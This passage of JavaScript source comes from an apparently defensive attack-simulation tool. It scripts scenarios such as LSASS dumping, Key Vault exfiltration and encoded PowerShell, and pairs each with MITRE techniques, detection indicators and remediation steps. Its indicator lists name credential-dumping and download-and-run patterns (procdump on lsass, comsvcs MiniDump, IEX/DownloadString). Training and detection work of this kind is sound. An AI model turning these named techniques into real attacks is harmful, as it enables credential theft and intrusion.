      { name: 'App Registration', progress: 20, duration: 10000, scriptPhase: 'execution' },
      { name: 'Credential Addition', progress: 45, duration: 8000 },
      { name: 'Permission Assignment', progress: 65, duration: 8000 },
      { name: 'Detection', progress: 85, duration: 6000, scriptPhase: 'detection' },
      { name: 'Alert Generated', progress: 100, duration: 4000 },
    ],
    iocs: {
      ips: [],
      techniques: ['T1136.003 - Cloud Account'],
      indicators: ['New app registration', 'Immediate credential addition', 'High-privilege API permissions requested']
    },
    remediation: [
      'Remove malicious app registration',
      'Revoke all associated credentials',
      'Review admin consent grants',
      'Audit compromised admin account activity'
    ]
  },
  keyVaultExfil: {
    id: 'keyvault-exfil',
    name: 'Key Vault Secret Exfiltration',
    description: 'Simulates unauthorized bulk access to Azure Key Vault secrets',
    severity: 'Critical',
    tactics: ['Credential Access', 'Collection'],
    techniques: ['T1552.004'],
    duration: 35000,
    icon: '🔐',
    scripts: ATTACK_SCRIPTS['keyvault-exfil'],
    phases: [
      { name: 'Token Obtained', progress: 0, duration: 4000, scriptPhase: 'reconnaissance' },
      { name: 'Key Vault Discovery', progress: 15, duration: 6000 },
      { name: 'Secret Enumeration', progress: 35, duration: 10000, scriptPhase: 'execution' },
      { name: 'Secret Retrieval', progress: 65, duration: 8000 },
      { name: 'Anomaly Detection', progress: 85, duration: 4000, scriptPhase: 'detection' },
      { name: 'Alert Generated', progress: 100, duration: 3000 },
    ],
    iocs: {
      ips: ['45.155.205.233'],
      techniques: ['T1552.004 - Private Keys'],
      indicators: ['Multiple secret gets', 'First-time IP accessing vault', 'Service principal access from unusual location']
    },
    remediation: [
      'Rotate all accessed secrets immediately',
      'Revoke compromised service principal',
      'Review Key Vault access policies',
      'Enable purge protection and soft delete'
    ]
  },
  lateralMovement: {
    id: 'lateral-movement',
    name: 'Lateral Movement via RDP/SMB',
    description: 'Simulates an attacker moving laterally through the network using stolen credentials',
    severity: 'High',
    tactics: ['Lateral Movement'],
    techniques: ['T1021.001', 'T1021.002'],
    duration: 45000,
    icon: '🕸️',
    scripts: ATTACK_SCRIPTS['lateral-movement'],
    phases: [
      { name: 'Initial Foothold', progress: 0, duration: 5000, scriptPhase: 'reconnaissance' },
      { name: 'Credential Harvesting', progress: 15, duration: 8000 },
      { name: 'Move to Workstation', progress: 35, duration: 10000, scriptPhase: 'execution' },
      { name: 'Move to Domain Controller', progress: 55, duration: 10000 },
      { name: 'Domain Admin Access', progress: 75, duration: 6000 },
      { name: 'Detection', progress: 90, duration: 4000, scriptPhase: 'detection' },
      { name: 'Alert Generated', progress: 100, duration: 2000 },
    ],
    iocs: {
      ips: ['10.0.0.15'],
      techniques: ['T1021.001 - RDP', 'T1021.002 - SMB'],
      indicators: ['New source-destination pairs', 'Admin account lateral movement', 'Type 10 logons to servers']
    },
    remediation: [
      'Isolate affected hosts',
      'Reset compromised credentials',
      'Enable RDP restricted admin mode',
      'Implement PAW for admin access'
    ]
  },
  dataExfiltration: {
    id: 'data-exfil',
    name: 'Data Exfiltration',
    description: 'Simulates large-scale data theft to an external destination',
    severity: 'Critical',
    tactics: ['Exfiltration'],
    techniques: ['T1041'],
    duration: 40000,
    icon: '📤',
    scripts: ATTACK_SCRIPTS['data-exfil'],
    phases: [
      { name: 'Data Discovery', progress: 0, duration: 6000, scriptPhase: 'reconnaissance' },
      { name: 'Data Staging', progress: 15, duration: 8000, scriptPhase: 'execution' },
      { name: 'Compression', progress: 35, duration: 6000 },
      { name: 'Encryption', progress: 50, duration: 5000 },
      { name: 'Exfiltration', progress: 65, duration: 8000 },
      { name: 'Volume Detection', progress: 85, duration: 4000, scriptPhase: 'detection' },
      { name: 'Alert Generated', progress: 100, duration: 3000 },
    ],
    iocs: {
      ips: ['45.155.205.233'],
      techniques: ['T1041 - Exfiltration Over C2'],
      indicators: ['175 MB to rare destination', 'First-time destination', 'After-hours transfer']
    },
    remediation: [
      'Block destination IP',
      'Isolate source host',
      'Identify exfiltrated data scope',
      'Initiate breach response procedures'
    ]
  },
  lsassDump: {
    id: 'lsass-dump',
    name: 'LSASS Credential Dumping',
    description: 'Simulates credential theft via LSASS memory access using tools like Mimikatz',
    severity: 'Critical',
    tactics: ['Credential Access'],
    techniques: ['T1003.001'],
    duration: 30000,
    icon: '💾',
    scripts: ATTACK_SCRIPTS['lsass-dump'],
    phases: [
      { name: 'Privilege Check', progress: 0, duration: 4000, scriptPhase: 'reconnaissance' },
      { name: 'Tool Deployment', progress: 15, duration: 6000, scriptPhase: 'execution' },
      { name: 'LSASS Access', progress: 40, duration: 8000 },
      { name: 'Memory Dump', progress: 65, duration: 6000 },
      { name: 'Detection', progress: 85, duration: 4000, scriptPhase: 'detection' },
      { name: 'Alert Generated', progress: 100, duration: 2000 },
    ],
    iocs: {
      ips: [],
      techniques: ['T1003.001 - LSASS Memory'],
      indicators: ['procdump.exe accessing lsass.exe', 'comsvcs.dll MiniDump', 'SeDebugPrivilege usage']
    },
    remediation: [
      'Isolate host immediately',
      'Collect memory forensics',
      'Reset all credentials on host',
      'Enable Credential Guard'
    ]
  },
  phishingCampaign: {
    id: 'phishing-campaign',
    name: 'Phishing Campaign',
    description: 'Simulates detection of a targeted phishing attack with malicious attachments',
    severity: 'High',
    tactics: ['Initial Access'],
    techniques: ['T1566.001'],
    duration: 35000,
    icon: '🎣',
    scripts: ATTACK_SCRIPTS['phishing-campaign'],
    phases: [
      { name: 'Infrastructure Setup', progress: 0, duration: 4000, scriptPhase: 'reconnaissance' },
      { name: 'Email Delivery', progress: 15, duration: 8000, scriptPhase: 'execution' },
      { name: 'Attachment Analysis', progress: 35, duration: 8000 },
      { name: 'Sandbox Detonation', progress: 55, duration: 8000 },
      { name: 'Malware Detection', progress: 75, duration: 4000, scriptPhase: 'detection' },
      { name: 'Alert Generated', progress: 100, duration: 3000 },
    ],
    iocs: {
      ips: [],
      techniques: ['T1566.001 - Spearphishing Attachment'],
      indicators: ['Lookalike domain', 'Macro-enabled attachment', 'Impersonation of Microsoft']
    },
    remediation: [
      'Quarantine all emails from domain',
      'Block sender domain',
      'Scan for opened attachments',
      'User awareness notification'
    ]
  },
  emailForwarding: {
    id: 'email-forwarding',
    name: 'Suspicious Email Forwarding',
    description: 'Simulates detection of unauthorized inbox forwarding rules for data theft',
    severity: 'High',
    tactics: ['Collection'],
    techniques: ['T1114.003'],
    duration: 25000,
    icon: '📧',
    scripts: ATTACK_SCRIPTS['email-forwarding'],
    phases: [
      { name: 'Account Compromise', progress: 0, duration: 4000, scriptPhase: 'reconnaissance' },
      { name: 'Rule Creation', progress: 25, duration: 8000, scriptPhase: 'execution' },
      { name: 'External Forward', progress: 50, duration: 6000 },
      { name: 'Rule Analysis', progress: 75, duration: 4000, scriptPhase: 'detection' },
      { name: 'Alert Generated', progress: 100, duration: 3000 },
    ],
    iocs: {
      ips: ['45.155.205.233'],
      techniques: ['T1114.003 - Email Forwarding Rule'],
      indicators: ['Forward to external domain', 'Rule created from unusual IP', 'Hidden rule name']
    },
    remediation: [
      'Remove malicious inbox rule',
      'Block external domain',
      'Reset user credentials',
      'Review all user inbox rules'
    ]
  },
  encodedPowerShell: {
    id: 'encoded-powershell',
    name: 'Encoded PowerShell Execution',
    description: 'Simulates detection of obfuscated PowerShell commands used for malware delivery',
    severity: 'High',
    tactics: ['Execution', 'Command and Control'],
    techniques: ['T1059.001', 'T1105'],
    duration: 30000,
    icon: '⚡',
    scripts: ATTACK_SCRIPTS['encoded-powershell'],
    phases: [
      { name: 'Macro Execution', progress: 0, duration: 4000, scriptPhase: 'reconnaissance' },
      { name: 'Base64 Decode', progress: 15, duration: 6000, scriptPhase: 'execution' },
      { name: 'Payload Download', progress: 35, duration: 8000 },
      { name: 'C2 Connection', progress: 55, duration: 6000 },
      { name: 'Detection', progress: 80, duration: 4000, scriptPhase: 'detection' },
      { name: 'Alert Generated', progress: 100, duration: 2000 },
    ],
    iocs: {
      ips: ['192.168.1.100'],
      techniques: ['T1059.001 - PowerShell', 'T1105 - Ingress Tool Transfer'],
      indicators: ['-EncodedCommand parameter', 'IEX/Invoke-Expression', 'DownloadString pattern']
    },
    remediation: [
      'Kill malicious process',
      'Block C2 domain/IP',
      'Isolate host',
      'Enable Constrained Language Mode'
    ]
  },
  privilegeEscalation: {
    id: 'privilege-escalation',
    name: 'Privileged Role Assignment',
    description: 'Simulates unauthorized assignment to Global Administrator role',
    severity: 'Critical',
    tactics: ['Persistence', 'Privilege Escalation'],
    techniques: ['T1098.003'],
    duration: 30000,
    icon: '👑',
    scripts: ATTACK_SCRIPTS['privilege-escalation'],
    phases: [
      { name: 'Admin Compromise', progress: 0, duration: 4000, scriptPhase: 'reconnaissance' },
      { name: 'Role Enumeration', progress: 15, duration: 6000 },
      { name: 'Role Assignment', progress: 35, duration: 10000, scriptPhase: 'execution' },
      { name: 'Privilege Obtained', progress: 65, duration: 6000 },
      { name: 'Detection', progress: 85, duration: 6000, scriptPhase: 'detection' },
      { name: 'Alert Generated', progress: 100, duration: 2000 },
    ],
    iocs: {
      ips: [],
      techniques: ['T1098.003 - Additional Cloud Roles'],
      indicators: ['Global Admin assignment', 'Privileged Role Admin used', 'Unauthorized account promoted']
    },
    remediation: [
      'Remove unauthorized role assignment',
      'Revoke all sessions for attacker account',
      'Reset compromised PRA account',
      'Enable PIM for role assignments'
    ]
  },
};

// Sample entities for generating realistic events
const SAMPLE_USERS = [
  'alice@contoso.com', 'bob@contoso.com', 'carol@contoso.com', 
  'david@contoso.com', 'erin@contoso.com', 'frank@contoso.com'
];

const SAMPLE_IPS = [
  '203.0.113.10', '198.51.100.23', '192.0.2.44', '45.155.205.233',
  '185.220.101.1', '89.248.165.52', '10.0.0.15', '10.0.1.25'
];

const SAMPLE_DEVICES = [
  'WORKSTATION-01', 'WORKSTATION-02', 'LAPTOP-DEV-03',
  'SERVER-DC01', 'SERVER-SQL01', 'SERVER-FILE01'
];

// Random selection helpers
const randomItem = (arr) => arr[Math.floor(Math.random() * arr.length)];
const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

class AttackSimulator {
  constructor() {
    this.activeSimulation = null;
    this.eventCallbacks = [];
    this.progressCallbacks = [];
    this.phaseCallbacks = [];
    this.scriptCallbacks = [];
    this.detailCallbacks = [];
  }

  onEvent(callback) {
    this.eventCallbacks.push(callback);
    return () => { this.eventCallbacks = this.eventCallbacks.filter(cb => cb !== callback); };
  }

  onProgress(callback) {
    this.progressCallbacks.push(callback);
    return () => { this.progressCallbacks = this.progressCallbacks.filter(cb => cb !== callback); };
  }

  onPhase(callback) {
    this.phaseCallbacks.push(callback);
    return () => { this.phaseCallbacks = this.phaseCallbacks.filter(cb => cb !== callback); };
  }

  onScript(callback) {
    this.scriptCallbacks.push(callback);
    return () => { this.scriptCallbacks = this.scriptCallbacks.filter(cb => cb !== callback); };
  }

  onDetail(callback) {
    this.detailCallbacks.push(callback);
    return () => { this.detailCallbacks = this.detailCallbacks.filter(cb => cb !== callback); };
  }

  emitEvent(event) { this.eventCallbacks.forEach(cb => cb(event)); }
  emitProgress(progress) { this.progressCallbacks.forEach(cb => cb(progress)); }
  emitPhase(phase) { this.phaseCallbacks.forEach(cb => cb(phase)); }
  emitScript(script) { this.scriptCallbacks.forEach(cb => cb(script)); }
  emitDetail(detail) { this.detailCallbacks.forEach(cb => cb(detail)); }

  getScenarios() {
    return Object.values(ATTACK_SCENARIOS);
  }

  getScenario(id) {
    return ATTACK_SCENARIOS[id] || Object.values(ATTACK_SCENARIOS).find(s => s.id === id);
  }

  async startSimulation(scenarioId) {
    const scenario = this.getScenario(scenarioId);
    if (!scenario) throw new Error(`Unknown scenario: ${scenarioId}`);
    if (this.activeSimulation) this.stopSimulation();

    this.activeSimulation = { scenario, startTime: Date.now(), cancelled: false };

    // Emit IOCs and remediation at start
    this.emitDetail({ type: 'iocs', data: scenario.iocs });
    this.emitDetail({ type: 'remediation', data: scenario.remediation });

    // Run through phases
    for (const phase of scenario.phases) {
      if (this.activeSimulation.cancelled) break;

      this.emitPhase(phase);
      this.emitProgress(phase.progress);

      // Emit scripts for this phase
      if (phase.scriptPhase && scenario.scripts?.[phase.scriptPhase]) {
        const scripts = scenario.scripts[phase.scriptPhase];
        for (const script of scripts) {
          if (this.activeSimulation.cancelled) break;
          this.emitScript(script);
          await this.sleep(randomInt(500, 1500));
          
          // Generate corresponding event
          if (script.type === 'alert') {
            this.emitEvent({
              id: uuidv4(),
              timestamp: new Date().toISOString(),
              type: 'Alert',
              severity: script.severity,
              title: script.name,
              description: `Detection triggered: ${script.name}`,
              mitre: scenario.techniques
            });
          } else if (script.type === 'log') {
            this.emitEvent({
              id: uuidv4(),
              timestamp: new Date().toISOString(),
              type: script.source,
              severity: 'Medium',
              title: `${script.source} event captured`,
              raw: script.raw,
              mitre: scenario.techniques
            });
          }
        }
      }

      await this.sleep(phase.duration);
    }

    this.emitProgress(100);

    // Generate final incident
    const incident = {
      id: uuidv4(),
      title: scenario.name,
      description: scenario.description,
      severity: scenario.severity,
      status: 'New',
      createdAt: new Date().toISOString(),
      tactics: scenario.tactics,
      techniques: scenario.techniques,
      iocs: scenario.iocs,
      remediation: scenario.remediation
    };

    this.emitDetail({ type: 'incident', data: incident });
    this.activeSimulation = null;
    return incident;
  }

  stopSimulation() {
    if (this.activeSimulation) {
      this.activeSimulation.cancelled = true;
      this.activeSimulation = null;
    }
  }

  isRunning() { return this.activeSimulation !== null; }
  sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
}

export const attackSimulator = new AttackSimulator();
export default attackSimulator;
